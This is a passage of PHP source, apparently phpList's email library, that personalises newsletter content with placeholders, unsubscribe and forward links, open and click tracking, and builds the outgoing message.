<?php
require_once dirname(__FILE__).'/accesscheck.php';

# send an email library

if (PHPMAILER) {
  include_once dirname(__FILE__).'/class.phplistmailer.php';
} else {
  require_once dirname(__FILE__)."/class.html.mime.mail.inc";
}
#require_once dirname(__FILE__)."/class.html.mime.mail.inc";
#require_once dirname(__FILE__)."/Rmail/Rmail.php";

if (!function_exists("output")) {
  function output($text) {
   }
}

function sendEmail ($messageid,$email,$hash,$htmlpref = 0,$rssitems = array(),$forwardedby = array()) {
  $getspeedstats = VERBOSE && !empty($GLOBALS['getspeedstats']) && isset($GLOBALS['processqueue_timer']);
  $sqlCountStart = $GLOBALS["pagestats"]["number_of_queries"];

  ## for testing concurrency, put in a delay to check if multiple send processes cause duplicates
  #usleep(rand(0,10) * 1000000);
    
  global $strThisLink,$strUnsubscribe,$PoweredByImage,$PoweredByText,$cached,$website;
  if ($email == "")
    return 0;
  if ($getspeedstats) output('sendEmail start '.$GLOBALS['processqueue_timer']->interval(1));
  
  #0013076: different content when forwarding 'to a friend'
  if (FORWARD_ALTERNATIVE_CONTENT) {
    $forwardContent = sizeof( $forwardedby ) > 0;
  } else {
    $forwardContent = 0;
  }

  if (empty($cached[$messageid])) {
    precacheMessage($messageid,$forwardContent);
  } else {
  #  dbg("Using cached {$cached[$messageid]["fromemail"]}");
    if (VERBOSE) output('Using cached message');
  }
  if (VERBOSE) {
    output($GLOBALS['I18N']->get('sendingmessage').' '.$messageid.' '.$GLOBALS['I18N']->get('withsubject').' '.
      $cached[$messageid]["subject"].' '.$GLOBALS['I18N']->get('to').' '.$email);
  }
  
  ## at this stage we don't know whether the content is HTML or text, it's just content
  $content = $cached[$messageid]['content'];

  # erase any placeholders that were not found
#  $msg = ereg_replace("\[[A-Z ]+\]","",$msg);

#0011857: forward to friend, retain attributes
  if (VERBOSE && $getspeedstats) {
    output('Load user start');
  }
  $userdata = array();
  $user_att_values = array();

  if ($hash == 'forwarded' && defined('KEEPFORWARDERATTRIBUTES') && KEEPFORWARDERATTRIBUTES) {
    $user_att_values = getUserAttributeValues($forwardedby['email']);
  } elseif ($hash != 'forwarded') {
    $user_att_values = getUserAttributeValues($email);
  }
  if (!is_array($user_att_values)) $user_att_values = array();

  ## the editor seems to replace spaces with &nbsp; so add those
  foreach ($user_att_values as $key => $val) {
    if (strpos($key,' ')) {
      $newkey = str_replace(' ','&nbsp;',$key);
      $user_att_values[$newkey] = $val;
    }
  }
 
  $query = sprintf('select * from %s where email = ?', $GLOBALS["tables"]["user"]);
  $rs = Sql_Query_Params($query, array($email));
  $userdata = Sql_Fetch_Assoc($rs);
  if (empty($userdata['id'])) {
    $userdata = array();
  }
  #var_dump($userdata);

  if (stripos($content,"[LISTS]") !== false) {
    $listsarr = array();
    $req = Sql_Query(sprintf('select list.name from %s as list,%s as listuser where list.id = listuser.listid and listuser.userid = %d',$GLOBALS["tables"]["list"],$GLOBALS["tables"]["listuser"],$userdata["id"]));
    while ($row = Sql_Fetch_Row($req)) {
      array_push($listsarr,$row[0]);
    }
    if (!empty($listsarr)) {
      $html['lists'] = join('<br/>',$listsarr);
      $text['lists'] = join("\n",$listsarr);
    } else {
      $html['lists'] = $GLOBALS['strNoListsFound'];
      $text['lists'] = $GLOBALS['strNoListsFound'];
    }
    unset($listsarr);
  }

  if (VERBOSE && $getspeedstats) {
    output('Load user end');
  }
  
  if ($cached[$messageid]['userspecific_url']) {
    if (VERBOSE && $getspeedstats) {
      output('fetch personal URL start');
    }

    ## Fetch external content, only if the URL has placeholders
    if ($GLOBALS["has_pear_http_request"] && preg_match("/\[URL:([^\s]+)\]/i",$content,$regs)) {
      while (isset($regs[1]) && strlen($regs[1])) {
        $url = $regs[1];
        if (!preg_match('/^http/i',$url)) {
          $url = 'http://'.$url;
        }
        $remote_content = fetchUrl($url,$userdata);

        # @@ don't use this
        #      $remote_content = includeStyles($remote_content);

        if ($remote_content) {
          $content = str_replace($regs[0],$remote_content,$content);
          $cached[$messageid]["htmlformatted"] = strip_tags($content) != $content;
        } else {
          logEvent("Error fetching URL: $regs[1] to send to $email");
          return 0;
        }
        preg_match("/\[URL:([^\s]+)\]/i",$content,$regs);
      }
    }
    if (VERBOSE && $getspeedstats) {
      output('fetch personal URL end');
    }
  }

  if (VERBOSE && $getspeedstats) {
    output('define placeholders start');
  }

  $url = getConfig("unsubscribeurl");$sep = strpos($url,'?') === false ? '?':'&amp;';
  $html["unsubscribe"] = sprintf('<a href="%s%suid=%s">%s</a>',$url,$sep,$hash,$strUnsubscribe);
  $text["unsubscribe"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $html["unsubscribeurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $text["unsubscribeurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);

  #0013076: Blacklisting posibility for unknown users
  $url = getConfig("blacklisturl");$sep = strpos($url,'?') === false ? '?':'&amp;';
  $html["blacklist"] = sprintf('<a href="%s%semail=%s">%s</a>',$url,$sep,$email,$strUnsubscribe);
  $text["blacklist"] = sprintf('%s%semail=%s',$url,$sep,$email);
  $html["blacklisturl"] = sprintf('%s%semail=%s',$url,$sep,$email);
  $text["blacklisturl"] = sprintf('%s%semail=%s',$url,$sep,$email);

  #0013076: Problem found during testing: message part must be parsed correctly as well.  
  if (sizeof($forwardedby) && isset($forwardedby['email'])) {
    $html["unsubscribe"] = $html["blacklist"];
    $text["unsubscribe"] = $text["blacklist"];
    $html["forwardedby"] = $forwardedby["email"];
    $text["forwardedby"] = $forwardedby["email"];
  }
  
  $url = getConfig("subscribeurl");$sep = strpos($url,'?') === false ? '?':'&amp;';
  $html["subscribe"] = sprintf('<a href="%s">%s</a>',$url,$strThisLink);
  $text["subscribe"] = sprintf('%s',$url);
  $html["subscribeurl"] = sprintf('%s',$url);
  $text["subscribeurl"] = sprintf('%s',$url);
  $url = getConfig("forwardurl");$sep = strpos($url,'?') === false ? '?':'&amp;';
  $html["forward"] = sprintf('<a href="%s%suid=%s&amp;mid=%d">%s</a>',$url,$sep,$hash,$messageid,$strThisLink);
  $text["forward"] = sprintf('%s%suid=%s&amp;mid=%d',$url,$sep,$hash,$messageid);
  $html["forwardurl"] = sprintf('%s%suid=%s&amp;mid=%d',$url,$sep,$hash,$messageid);
  $text["forwardurl"] = $text["forward"];
  $html["messageid"] = sprintf('%d',$messageid);
  $text["messageid"] = sprintf('%d',$messageid);
  $url = getConfig("forwardurl");

  # make sure there are no newlines, otherwise they get turned into <br/>s
  $html["forwardform"] = sprintf('<form method="get" action="%s" name="forwardform" class="forwardform"><input type="hidden" name="uid" value="%s" /><input type="hidden" name="mid" value="%d" /><input type="hidden" name="p" value="forward" /><input type=text name="email" value="" class="forwardinput" /><input name="Send" type="submit" value="%s" class="forwardsubmit"/></form>',$url,$hash,$messageid,$GLOBALS['strForward']);
  $text["signature"] = "\n\n-- powered by phpList, www.phplist.com --\n\n";
  $url = getConfig("preferencesurl");$sep = strpos($url,'?') === false ? '?':'&amp;';
  $html["preferences"] = sprintf('<a href="%s%suid=%s">%s</a>',$url,$sep,$hash,$strThisLink);
  $text["preferences"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $html["preferencesurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $text["preferencesurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  #historical, not sure it's still used
  $html["userid"] = $hash;
  $text["userid"] = $hash;

  if ($hash != 'forwarded') {
    $text['footer'] = $cached[$messageid]["textfooter"];
    $html['footer'] = $cached[$messageid]["htmlfooter"];
  } else {
    #0013076: different content when forwarding 'to a friend'
    if( FORWARD_ALTERNATIVE_CONTENT ) {
      $text['footer'] = stripslashes($messagedata["forwardfooter"]);
    } else {
      $text['footer'] = getConfig('forwardfooter');
    }
    $html['footer'] = $text['footer'];
  }
  
/*
  We request you retain the signature below in your emails including the links.
  This not only gives respect to the large amount of time given freely
  by the developers  but also helps build interest, traffic and use of
  phpList, which is beneficial to it's future development.

  You can configure how the credits are added to your pages and emails in your
  config file.

  Michiel Dethmers, phpList Ltd 2003 - 2011
*/
  if (!EMAILTEXTCREDITS) {
    $html["signature"] = $PoweredByImage;#'<div align="center" id="signature"><a href="http://www.phplist.com"><img src="powerphplist.png" width=88 height=31 title="Powered by PHPlist" alt="Powered by PHPlist" border="0" /></a></div>';
    # oops, accidentally became spyware, never intended that, so take it out again :-)
    $html["signature"] = preg_replace('/src=".*power-phplist.png"/','src="powerphplist.png"',$html["signature"]);
  } else {
    $html["signature"] = $PoweredByText;
  }
#  $content = $cached[$messageid]["htmlcontent"];

  if (VERBOSE && $getspeedstats) {
    output('define placeholders end');
  }

  ## Fill text and html versions depending on given versions.

  if (VERBOSE && $getspeedstats) {
    output('parse text to html or html to text start');
  }

  if ($cached[$messageid]["htmlformatted"]) {
    if (empty($cached[$messageid]["textcontent"])) {
      $textcontent = HTML2Text($content);
    } else {
      $textcontent = $cached[$messageid]["textcontent"];
    }
    $htmlcontent = $content;
  } else {
    if (empty($cached[$messageid]["textcontent"])) {
      $textcontent = $content;
    } else {
      $textcontent = $cached[$messageid]["textcontent"];
    }
    $htmlcontent = parseText($content);
  }

  if (VERBOSE && $getspeedstats) {
    output('parse text to html or html to text end');
  }

  $defaultstyle = getConfig("html_email_style");
  $adddefaultstyle = 0;
  
  if (VERBOSE && $getspeedstats) {
    output('merge into template start');
  }

  if ($cached[$messageid]["template"])
    # template used
    $htmlmessage = str_replace("[CONTENT]",$htmlcontent,$cached[$messageid]["template"]);
  else {
    # no template used
    $htmlmessage = $htmlcontent;
    $adddefaultstyle = 1;
  }
  $textmessage = $textcontent;
  
  if (VERBOSE && $getspeedstats) {
    output('merge into template end');
  }
  ## Parse placeholders

  if (VERBOSE && $getspeedstats) {
    output('parse placeholders start');
  }


/*
  var_dump($html);
  var_dump($userdata);
  var_dump($user_att_values);
  exit;
*/


#  print htmlspecialchars($htmlmessage);exit;

  ### @@@TODO don't use forward and forward form in a forwarded message as it'll fail

  if (strpos($htmlmessage, "[FOOTER]") !== false)
    $htmlmessage = str_ireplace("[FOOTER]",$html["footer"],$htmlmessage);
  elseif ($html["footer"])
    $htmlmessage = addHTMLFooter($htmlmessage,'<br />'.$html["footer"]);

  if (strpos($htmlmessage,"[SIGNATURE]") !== false) {
    $htmlmessage = str_ireplace("[SIGNATURE]",$html["signature"],$htmlmessage);
  } else {
# BUGFIX 0015303, 2/2
//    $htmlmessage .= '<br />'.$html["signature"];
      $htmlmessage = addHTMLFooter($htmlmessage, '
'. $html["signature"]);
  }


# END BUGFIX 0015303, 2/2

  if (strpos($textmessage,"[FOOTER]"))
    $textmessage = str_ireplace("[FOOTER]",$text["footer"],$textmessage);
  else
    $textmessage .= "\n\n".$text["footer"];

  if (strpos($textmessage,'[SIGNATURE]'))
    $textmessage = str_ireplace("[SIGNATURE]",$text["signature"],$textmessage);
  else
    $textmessage .= "\n".$text["signature"];

  ### addition to handle [FORWARDURL:Message ID:Link Text] (link text optional)

  while (preg_match('/\[FORWARD:([^\]]+)\]/Uxm',$htmlmessage,$regs)) {
    $newforward = $regs[1];
    $matchtext = $regs[0];
    if (strpos($newforward,':')) {
      ## using FORWARDURL:messageid:linktext
      list($forwardmessage,$forwardtext) = explode(':',$newforward);
    } else {
      $forwardmessage = sprintf('%d',$newforward);
      $forwardtext = 'this link';
    }
    if (!empty($forwardmessage)) {
      $url = getConfig("forwardurl");$sep = strpos($url,'?') === false ? '?':'&amp;';
      $forwardurl = sprintf('%s%suid=%s&amp;mid=%d',$url,$sep,$hash,$forwardmessage);
      $htmlmessage = str_replace($matchtext,'<a href="'.$forwardurl.'">'.$forwardtext.'</a>',$htmlmessage);
    } else {
      ## make sure to remove the match, otherwise, it'll be an eternal loop
      $htmlmessage = str_replace($matchtext,'',$htmlmessage);
    }
  }

  ## the text message has to be parsed seperately, because the line might wrap if the text for the link is long, so the match text is different
  while (preg_match('/\[FORWARD:([^\]]+)\]/Uxm',$textmessage,$regs)) {
    $newforward = $regs[1];
    $matchtext = $regs[0];
    if (strpos($newforward,':')) {
      ## using FORWARDURL:messageid:linktext
      list($forwardmessage,$forwardtext) = explode(':',$newforward);
    } else {
      $forwardmessage = sprintf('%d',$newforward);
      $forwardtext = 'this link';
    }
    if (!empty($forwardmessage)) {
      $url = getConfig("forwardurl");$sep = strpos($url,'?') === false ? '?':'&amp;';
      $forwardurl = sprintf('%s%suid=%s&amp;mid=%d',$url,$sep,$hash,$forwardmessage);
      $textmessage = str_replace($matchtext,$forwardtext.' '.$forwardurl,$textmessage);
    } else {
      ## make sure to remove the match, otherwise, it'll be an eternal loop
      $textmessage = str_replace($matchtext,'',$textmessage);
    }
  }

#  $req = Sql_Query(sprintf('select filename,data from %s where template = %d',
#    $GLOBALS["tables"]["templateimage"],$cached[$messageid]["templateid"]));

  if (ALWAYS_ADD_USERTRACK) {
    if (stripos($htmlmessage,'</body>')) {
      $htmlmessage = str_replace('</body>','<img src="'.$GLOBALS['scheme'].'://'.$website.$GLOBALS["pageroot"].'/ut.php?u='.$hash.'&m='.$messageid.'" width="1" height="1" border="0" /></body>',$htmlmessage);
    } else {
      $htmlmessage .= '<img src="'.$GLOBALS['scheme'].'://'.$website.$GLOBALS["pageroot"].'/ut.php?u='.$hash.'&m='.$messageid.'" width="1" height="1" border="0" />';
    }
  } else {
    ## can't use str_replace or str_ireplace, because those replace all, and we only want to replace one
    $htmlmessage = preg_replace( '/\[USERTRACK\]/i','<img src="'.$GLOBALS['scheme'].'://'.$website.$GLOBALS["pageroot"].'/ut.php?u='.$hash.'&m='.$messageid.'" width="1" height="1" border="0" />',$htmlmessage,1);
  }
  # make sure to only include usertrack once, otherwise the stats would go silly
  $htmlmessage = str_ireplace('[USERTRACK]','',$htmlmessage);

  if (!empty($cached[$messageid]['listowner'])) {
    $att_req = Sql_Query("select name,value from {$GLOBALS["tables"]["adminattribute"]},{$GLOBALS["tables"]["admin_attribute"]} where {$GLOBALS["tables"]["adminattribute"]}.id = {$GLOBALS["tables"]["admin_attribute"]}.adminattributeid and {$GLOBALS["tables"]["admin_attribute"]}.adminid = ".$cached[$messageid]['listowner']);
    while ($att = Sql_Fetch_Array($att_req)) {
      $htmlmessage = preg_replace("#\[LISTOWNER.".strtoupper(preg_quote($att["name"]))."\]#",$att["value"],$htmlmessage);
    }
  }
  $html['subject'] = $cached[$messageid]["subject"];
  $text['subject'] = $cached[$messageid]["subject"];
  
  $htmlmessage = parsePlaceHolders($htmlmessage,$html);
  $textmessage = parsePlaceHolders($textmessage,$text);

  if (VERBOSE && $getspeedstats) {
    output('parse placeholders end');
  }

  if (VERBOSE && $getspeedstats) {
    output('parse userdata start');
  }
  
  $htmlmessage = parsePlaceHolders($htmlmessage,$userdata);
  $textmessage = parsePlaceHolders($textmessage,$userdata);

//CUT 2
  
  $destinationemail = '';
  if (is_array($user_att_values)) {
// CUT 3
    $htmlmessage = parsePlaceHolders($htmlmessage,$user_att_values);
    $textmessage = parsePlaceHolders($textmessage,$user_att_values);
  }

  if (VERBOSE && $getspeedstats) {
    output('parse userdata end');
  }

  if (!$destinationemail) {
    $destinationemail = $email;
  }

  # this should move into a plugin
  if (strpos($destinationemail,'@') === false && isset($GLOBALS["expand_unqualifiedemail"])) {
    $destinationemail .= $GLOBALS["expand_unqualifiedemail"];
  }
  
  if (VERBOSE && $getspeedstats) {
    output('pass to plugins for destination email start');
  }
  foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
#    print "Checking Destination for ".$plugin->name."<br/>";
    $destinationemail = $plugin->setFinalDestinationEmail($messageid,$user_att_values,$destinationemail);
  }
  if (VERBOSE && $getspeedstats) {
    output('pass to plugins for destination email end');
  }

  ## click tracking
  # for now we won't click track forwards, as they are not necessarily users, so everything would fail
  if (VERBOSE && $getspeedstats) {
    output('click track start');
  }

  if (CLICKTRACK && $hash != 'forwarded' && !empty($userdata['id'])) {
    $urlbase = '';
    # let's leave this for now
    /*
    if (preg_match('/<base href="(.*)"([^>]*)>/Umis',$htmlmessage,$regs)) {
      $urlbase = $regs[1];
    } else {
      $urlbase = '';
    }
#    print "URLBASE: $urlbase<br/>";
    */

    # convert html message
#    preg_match_all('/<a href="?([^> "]*)"?([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
    preg_match_all('/<a(.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);

    # to process the Yahoo webpage with base href and link like <a href=link> we'd need this one
#    preg_match_all('/<a href=([^> ]*)([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
    $clicktrack_root = sprintf('%s://%s/lt.php',$GLOBALS["scheme"],$website.$GLOBALS["pageroot"]);
    for($i=0; $i<count($links[2]); $i++){
      $link = cleanUrl($links[2][$i]); 
      $link = str_replace('"','',$link);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
      $linkid = 0;

      $linktext = $links[4][$i];

      ## if the link is text containing a "protocol" eg http:// then do not track it, otherwise
      ## it will look like Phishing
      ## it's ok when the link is an image
      $linktext = strip_tags($linktext);
      $looksLikePhishing = stripos($linktext,'https://') !== false || stripos($linktext,'http://') !== false;
      
      if (!$looksLikePhishing && (preg_match('/^http|ftp/',$link) || preg_match('/^http|ftp/',$urlbase)) && $link != 'http://www.phplist.com' && !strpos($link,$clicktrack_root)) {
        # take off personal uids
        $url = cleanUrl($link,array('PHPSESSID','uid'));

#        $url = preg_replace('/&uid=[^\s&]+/','',$link);

#        if (!strpos('http:',$link)) {
#          $link = $urlbase . $link;
#        }

        $linkid = clickTrackLinkId($messageid,$userdata['id'],$url,$link);

        $masked = "H|$linkid|$messageid|".$userdata['id'] ^ XORmask;
        $masked = urlencode(base64_encode($masked));
        if (!CLICKTRACK_LINKMAP) {
          $newlink = sprintf('<a%shref="%s://%s/lt.php?id=%s" %s>%s</a>',$links[1][$i],$GLOBALS["scheme"],$website.$GLOBALS["pageroot"],$masked,$links[3][$i],$links[4][$i]);
        } else {
          $newlink = sprintf('<a%shref="%s://%s%s" %s>%s</a>',$links[1][$i],$GLOBALS["scheme"],$website.CLICKTRACK_LINKMAP,$masked,$links[3][$i],$links[4][$i]);
        }
        $htmlmessage = str_replace($links[0][$i], $newlink, $htmlmessage);
      }
    }

    # convert Text message
    # first find occurances of our top domain, to avoid replacing them later

    # hmm, this is no point, it's not just *our* topdomain, but any 

  if (0) {
    preg_match_all('#(https?://'.$GLOBALS['website'].'/?)\s+#mis',$textmessage,$links);
#    preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textmessage,$links);
#    preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textmessage,$links);

    for($i=0; $i<count($links[1]); $i++){
      # not entirely sure why strtolower was used, but it seems to break things http://mantis.phplist.com/view.php?id=4406
#      $link = strtolower(cleanUrl($links[1][$i]));
      $link = cleanUrl($links[1][$i]);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
      $linkid = 0;
      if (preg_match('/^http|ftp/',$link) && $link != 'http://www.phplist.com' && !strpos($link,$clicktrack_root)) {
        $url = cleanUrl($link,array('PHPSESSID','uid'));
        $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,url,forward)
          values(%d,%d,"%s","%s")',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$url,$link));
        $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forward = "%s"
        ',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$link));
        $linkid = $req[0];

        $masked = "T|$linkid|$messageid|".$userdata['id'] ^ XORmask;
        $masked = urlencode(base64_encode($masked));
        $newlink = sprintf('%s://%s/lt.php?id=%s',$GLOBALS["scheme"],$website.$GLOBALS["pageroot"],$masked);
        $textmessage = str_replace($links[0][$i], '<'.$newlink.'>', $textmessage);
      }
    }

  }
    #now find the rest
    # @@@ needs to expand to find complete urls like:
    #http://user:password@www.web-site.com:1234/document.php?parameter=something&otherpar=somethingelse#anchor
    # or secure
    #https://user:password@www.website.com:2345/document.php?parameter=something%20&otherpar=somethingelse#anchor

    preg_match_all('#(https?://[^\s\>\}\,]+)#mis',$textmessage,$links);
#    preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textmessage,$links);
#    preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textmessage,$links);
    ## sort the results in reverse order, so that they are replaced correctly
    rsort($links[1]);
    $newlinks = array();

    for($i=0; $i<count($links[1]); $i++){
      $link = cleanUrl($links[1][$i]);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
  
      $linkid = 0;
      if (preg_match('/^http|ftp/',$link) && $link != 'http://www.phplist.com') {# && !strpos($link,$clicktrack_root)) {
        $url = cleanUrl($link,array('PHPSESSID','uid'));

        $linkid = clickTrackLinkId($messageid,$userdata['id'],$url,$link);

        $masked = "T|$linkid|$messageid|".$userdata['id'] ^ XORmask;
        $masked = urlencode(base64_encode($masked));
        if (!CLICKTRACK_LINKMAP) {
          $newlinks[$linkid] = sprintf('%s://%s/lt.php?id=%s',$GLOBALS["scheme"],$website.$GLOBALS["pageroot"],$masked);
        } else {
          $newlinks[$linkid] = sprintf('%s://%s%s',$GLOBALS["scheme"],$website.CLICKTRACK_LINKMAP,$masked);
        }

#        print $links[0][$i] .' -> '.$newlink.'<br/>';
        $textmessage = str_replace($links[1][$i], '[%%%'.$linkid.'%%%]', $textmessage);
      }
    }
    foreach ($newlinks as $linkid => $newlink) {
      $textmessage = str_replace('[%%%'.$linkid.'%%%]',$newlink, $textmessage);
    }
  }
  if (VERBOSE && $getspeedstats) {
    output('click track end');
  }

  ## if we're not tracking clicks, we should add Google tracking here
  ## otherwise, we can add it when redirecting on the click
  if (!CLICKTRACK && !empty($cached[$messageid]['google_track'])) { 
    preg_match_all('/<a(.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
    for($i=0; $i<count($links[2]); $i++){
      $link = cleanUrl($links[2][$i]);
      $link = str_replace('"','',$link);  
      ## http://www.google.com/support/analytics/bin/answer.py?hl=en&answer=55578

      $trackingcode = 'utm_source=emailcampaign'.$messageid.'&utm_medium=phpList&utm_content=HTMLemail&utm_campaign='.urlencode($cached[$messageid]["subject"]);
      ## take off existing tracking code, if found
      if (strpos($link,'utm_medium') !== false) {
        $link = preg_replace('/utm_(\w+)\=[^&]+&/U','',$link);
      }
        
      if (strpos($link,'?')) {
        $newurl = $link.'&'.$trackingcode;
      } else {
        $newurl = $link.'?'.$trackingcode;
      }
   #   print $link. ' '.$newurl.' <br/>';
      $newlink = sprintf('<a%shref="%s" %s>%s</a>',$links[1][$i],$newurl,$links[3][$i],$links[4][$i]);
      $htmlmessage = str_replace($links[0][$i], $newlink, $htmlmessage);
    }
    
    preg_match_all('#(https?://[^\s\>\}\,]+)#mis',$textmessage,$links);
    rsort($links[1]);
    $newlinks = array();

    for($i=0; $i<count($links[1]); $i++){
      $link = cleanUrl($links[1][$i]);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
  
      if (preg_match('/^http|ftp/',$link) && $link != 'http://www.phplist.com' ) {# && !strpos($link,$clicktrack_root)) {
        $url = cleanUrl($link,array('PHPSESSID','uid'));
        $trackingcode = 'utm_source=emailcampaign'.$messageid.'&utm_medium=phpList&utm_content=textemail&utm_campaign='.urlencode($cached[$messageid]["subject"]);
        ## take off existing tracking code, if found
        if (strpos($link,'utm_medium') !== false) {
          $link = preg_replace('/utm_(\w+)\=[^&]+/','',$link);
        }
        if (strpos($link,'?')) {
          $newurl = $link.'&'.$trackingcode;
        } else {
          $newurl = $link.'?'.$trackingcode;
        }

        $newlinks[$i] = $newurl;
        $textmessage = str_replace($links[1][$i], '[%%%'.$i.'%%%]', $textmessage);
      }
    }
    foreach ($newlinks as $linkid => $newlink) {
      $textmessage = str_replace('[%%%'.$linkid.'%%%]',$newlink, $textmessage);
    }
    unset($newlinks);
  }

#  print htmlspecialchars($htmlmessage);exit;

  #0011996: forward to friend - personal message
  if (FORWARD_PERSONAL_NOTE_SIZE && $hash == 'forwarded' && !empty($forwardedby['personalNote']) ) {
    $htmlmessage =  nl2br($forwardedby['personalNote']) . '<br/>' .  $htmlmessage;
    $textmessage = $forwardedby['personalNote'] . "\n" . $textmessage;
  }
  if (VERBOSE && $getspeedstats) {
    output('cleanup start');
  }
  
  ## allow fallback to default value for the ones that do not have a value
  ## delimiter is %% to avoid interfering with markup
  
  preg_match_all('/\[.*\%\%([^\]]+)\]/Ui',$htmlmessage,$matches);
  for ($i = 0; $i<count($matches[0]);$i++) {
    $htmlmessage = str_ireplace($matches[0][$i],$matches[1][$i],$htmlmessage);
  }
  preg_match_all('/\[.*\%\%([^\]]+)\]/Ui',$textmessage,$matches);
  for ($i = 0; $i<count($matches[0]);$i++) {
    $textmessage = str_ireplace($matches[0][$i],$matches[1][$i],$textmessage);
  }

  ## remove any remaining placeholders
  $htmlmessage = preg_replace("/\[[A-Z\. ]+\]/i","",$htmlmessage);
  $textmessage = preg_replace("/\[[A-Z\. ]+\]/i","",$textmessage);
#  print htmlspecialchars($htmlmessage);exit;

  # check that the HTML message as proper <head> </head> and <body> </body> tags
  # some readers fail when it doesn't
  if (!preg_match("#<body.*</body>#ims",$htmlmessage)) {
    $htmlmessage = '<body>'.$htmlmessage.'</body>';
  }
  if (!preg_match("#<head.*</head>#ims",$htmlmessage)) {
    if (!$adddefaultstyle) {
     $defaultstyle = "";
    }
    $htmlmessage = '<head>
        <meta content="text/html;charset='.$cached[$messageid]["html_charset"].'" http-equiv="Content-Type">
        <title></title>'.$defaultstyle.'</head>'.$htmlmessage;
  }
  if (!preg_match("#<html.*</html>#ims",$htmlmessage)) {
    $htmlmessage = '<html>'.$htmlmessage.'</html>';
  }
  
  ## remove trailing code after </html>
  $htmlmessage = preg_replace('#</html>.*#msi','</html>',$htmlmessage);
  
  ## the editor sometimes places <p> and </p> around the URL
  $htmlmessage = str_ireplace('<p><!DOCTYPE','<!DOCTYPE',$htmlmessage);
  $htmlmessage = str_ireplace('</html></p>','</html>',$htmlmessage);

  if (VERBOSE && $getspeedstats) {
    output('cleanup end');
  }
#  $htmlmessage = compressContent($htmlmessage);

 # print htmlspecialchars($htmlmessage);exit;

  if ($getspeedstats) output('build Start '.$GLOBALS['processqueue_timer']->interval(1));

  if (0) {  ## old method retired
    $mail = new html_mime_mail(
      array('X-Mailer: PHPlist v'.VERSION,
            "X-MessageId: $messageid",
            "X-ListMember: $email",
            "Precedence: bulk",
            "List-Help: <".$text["preferences"].">",
            "List-Unsubscribe: <".$text["unsubscribe"].">",
            "List-Subscribe: <".getConfig("subscribeurl").">",
            "List-Owner: <mailto:".getConfig("admin_address").">"
    ));
  } else {
    # build the email
    $mail = new PHPlistMailer($messageid,$destinationemail);
    if ($forwardedby) {
      $mail->add_timestamp();
    }
    $mail->addCustomHeader("List-Help: <".$text["preferences"].">");
    $mail->addCustomHeader("List-Unsubscribe: <".$text["unsubscribe"].">");
    $mail->addCustomHeader("List-Subscribe: <".getConfig("subscribeurl").">");
    $mail->addCustomHeader("List-Owner: <mailto:".getConfig("admin_address").">");
  }

  list($dummy,$domaincheck) = explode('@',$destinationemail);
  $text_domains = explode("\n",trim(getConfig("alwayssendtextto")));
  if (in_array($domaincheck,$text_domains)) {
    $htmlpref = 0;
    if (VERBOSE)
      output($GLOBALS['I18N']->get('sendingtextonlyto')." $domaincheck");
  }
  
/*
  foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
    $textmessage = $plugin->parseOutgoingTextMessage($messageid,$textmessage,$destinationemail, $userdata);
    $htmlmessage = $plugin->parseOutgoingHTMLMessage($messageid,$htmlmessage,$destinationemail, $userdata);
    $plugin_attachments = $plugin->getMessageAttachment($messageid,$mail->Body);
    if (!empty($plugin_attachments[0]['content'])) {
      foreach ($plugins_attachments as $plugin_attachment) {
        $mail->add_attachment($plugin_attachment['content'],
            basename($plugin_attachment["filename"]),
            $plugin_attachment["mimetype"]);
      }
    }
  }
*/

  # so what do we actually send?
  switch($cached[$messageid]["sendformat"]) {
    case "PDF":
      # send a PDF file to users who want html and text to everyone else
      foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
        $plugin->processSuccesFailure ($messageid, 'astext', $userdata);
      }
      if ($htmlpref) {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set aspdf = aspdf + 1 where id = $messageid");
        $pdffile = createPdf($textmessage);
        if (is_file($pdffile) && filesize($pdffile)) {
          $fp = fopen($pdffile,"r");
          if ($fp) {
            $contents = fread($fp,filesize($pdffile));
            fclose($fp);
           unlink($pdffile);
           $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
#            $mail->add_html($html,$textmessage);
#            $mail->add_text($textmessage);
            $mail->add_attachment($contents,
              "message.pdf",
              "application/pdf");
          }
        }
        addAttachments($messageid,$mail,"HTML");
      } else {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
        $mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "text and PDF":
      foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
        $plugin->processSuccesFailure ($messageid, 'astext', $userdata);
      }
      # send a PDF file to users who want html and text to everyone else
      if ($htmlpref) {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astextandpdf = astextandpdf + 1 where id = $messageid");
        $pdffile = createPdf($textmessage);
